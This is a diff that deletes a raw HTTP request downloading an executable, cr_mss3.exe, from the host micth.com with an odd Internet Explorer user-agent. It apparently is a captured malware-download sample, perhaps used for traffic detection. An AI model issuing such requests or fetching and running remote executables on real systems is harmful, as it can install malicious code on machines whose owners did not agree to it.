@@ -1,8 +1,0 @@
-Get /templates/atomic/cr_mss3.exe HTTP/1.1
-Accept: */*
-User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)
-Host: micth.com
-Content-Length: 0
-Connection: Keep-Alive
-Cache-Control: no-cache
-
